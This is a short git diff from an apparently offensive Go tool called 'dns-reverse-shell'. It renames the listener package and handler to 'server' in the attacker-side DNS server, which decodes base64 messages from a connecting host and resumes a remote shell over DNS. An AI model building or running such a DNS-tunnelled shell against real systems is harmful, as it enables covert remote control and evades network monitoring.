@@ -1,4 +1,4 @@
-package listener
+package server
 
 import (
 	"dns-reverse-shell/main/protocol"
@@ -26,18 +26,18 @@ type DNSServer struct {
 func NewDnsServer(port string) *DNSServer {
 	d := &DNSServer{port: port, connectionHandler: newConnectionHandler()}
 	d.handler = newDnsHandler(d)
-	d.commandHandler = newListenerCommandHandler()
+	d.commandHandler = newServerCommandHandler()
 	d.messageHandler = protocol.NewMessageHandler(encoder.NewBase64Encoder(), protocol.NewSimpleMessageSplitter())
 	return d
 }
 
 func (s *DNSServer) Initialize() {
 	server := s.createServer()
-	fmt.Println("Starting Listener on port '" + s.port + "'")
-	go s.commandHandler.(*listenerCommandHandler).init()
+	fmt.Println("Starting server on port '" + s.port + "'")
+	go s.commandHandler.(*serverCommandHandler).init()
 	err := server.ListenAndServe()
 	if err != nil {
-		fmt.Printf("Failed to start listener: %s\n", err.Error())
+		fmt.Printf("Failed to start server: %s\n", err.Error())
 	}
 }
 
@@ -56,8 +56,8 @@ func (h *dnsHandler) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
 		h.server.connectionHandler.setConnectionStatus(true)
 		ip := h.server.messageHandler.DecodeAnswerMsg(r)
 		fmt.Println("connected to " + ip)
-		go h.server.commandHandler.(*listenerCommandHandler).initTimeout()
-		h.server.commandHandler.(*listenerCommandHandler).shell.Resume()
+		go h.server.commandHandler.(*serverCommandHandler).initTimeout()
+		h.server.commandHandler.(*serverCommandHandler).shell.Resume()
 	}
 	h.server.handleMessage(w, r)
 }
